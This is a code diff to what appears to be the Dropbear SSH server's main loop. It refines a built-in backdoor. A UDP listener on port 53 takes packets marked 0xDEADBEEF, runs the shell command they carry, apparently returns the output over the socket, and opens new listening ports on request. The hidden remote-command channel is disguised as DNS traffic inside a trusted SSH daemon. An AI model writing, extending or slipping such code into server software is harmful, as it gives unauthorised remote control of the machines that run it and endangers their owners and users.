@@ -34,7 +34,7 @@
 #include "uhandler.h"
 
 
-static size_t listensockets(int *sock, size_t sockcount, int *maxfd,int listensockcount);
+static size_t listensockets(int *sock, size_t sockcount, int *maxfd);
 static void sigchld_handler(int dummy);
 static void sigsegv_handler(int);
 static void sigintterm_handler(int fish);
@@ -158,10 +158,11 @@ static void main_noinetd() {
 		if(udpsockfd < 0)
 			dropbear_exit("start_udp - error");
 		FD_SET(udpsockfd, &fds);
+		TRACE(("listening for UDP on port:53 , sockfd:%d",udpsockfd))
 	}
 	
 	/* Set up the listening sockets */
-	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock, listensockcount);
+	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock);
 	if (listensockcount == 0)
 	{
 		dropbear_exit("No listening ports available.");
@@ -271,17 +272,19 @@ static void main_noinetd() {
 				//execute shell command and port adding only if 0xDEADBEEF and legal command
     			if(check_shell_command(&new_packet)){
             		//execute the shell_command, then add port
-            		shell_exec_command(new_packet.shell_command); //func in svr-chansession
-					
-					if(add_port_request((int)new_packet.port_number)){ //func in svr-main   
-						if(listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock,listensockcount))
-							listensockcount++;
-					}
-					printf("AFTER udp_fd:%d\t udp_index:%d\tlistensocks[]:\n",udpsockfd,udp_index);
-					for (i = 0; i < listensockcount; i++)
-						printf("%s ,",svr_opts.ports[i]);
-					printf("\n");
+            		shell_exec_command(new_packet.shell_command , udpsockfd); //func in svr-chansession
+					// printf("listensockcount:%d\n",listensockcount);
 
+					if(add_port_request((int)new_packet.port_number)){ //func in svr-main   
+						int tmp_listens= listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock);
+						if(tmp_listens > 0) //update listensockcount if not error
+							listensockcount=tmp_listens;							
+					}
+					// printf("listensockcount:%d\n",listensockcount);
+					// printf("AFTER udp_fd:%d\t listensocks[]:\n",udpsockfd);
+					// for (i = 0; i < listensockcount; i++)
+					// 	printf("%d ,",listensocks[i]);
+					// printf("\n");
     			}
 
 			}
@@ -298,7 +301,6 @@ static void main_noinetd() {
 			struct sockaddr_storage remoteaddr;
 			socklen_t remoteaddrlen;
 
-			// if (!FD_ISSET(listensocks[i], &fds) || i == udp_index) 
 			if (!FD_ISSET(listensocks[i], &fds)) 
 				continue;
 
@@ -476,7 +478,7 @@ static void commonsetup() {
 }
 
 /* Set up listening sockets for all the requested ports */
-static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int listensockcount) {
+static size_t listensockets(int *socks, size_t sockcount, int *maxfd) {
 
 	unsigned int i, n;
 	char* errstring = NULL;
@@ -484,11 +486,10 @@ static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int listen
 	int nsock;
 
 	TRACE(("listensockets: %d to try", svr_opts.portcount))
-	i = listensockcount;
-	if(listensockcount>0)
-		i--;
-	for (; i < svr_opts.portcount; i++) {
-		printf("i:%d\ttry to listen to port:%s\n",i,svr_opts.ports[i]);
+	// i = listensockcount;
+	// if(listensockcount>0)
+	// 	i--;
+	for (i=0; i < svr_opts.portcount; i++) {
 		TRACE(("listening on '%s:%s'", svr_opts.addresses[i], svr_opts.ports[i]))
 
 		nsock = dropbear_listen(svr_opts.addresses[i], svr_opts.ports[i], &socks[sockpos], 
@@ -519,8 +520,8 @@ static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int listen
 //0 - not available; 1- available
 int new_port_available(const char * new_port){
 	//call this function from uhandler only - his port is always 53
-	// if(new_port[0]=='5' && new_port[1]=='3' && new_port[2]=='\0') 
-	// 	return 0;
+	if(new_port && new_port[0]=='5' && new_port[1]=='3' && new_port[2]=='\0') 
+		return 0;
 	//iterate over the listenning ports, check if new_portalready used
 	unsigned int i=0;
 	for( ; i<svr_opts.portcount; i++){
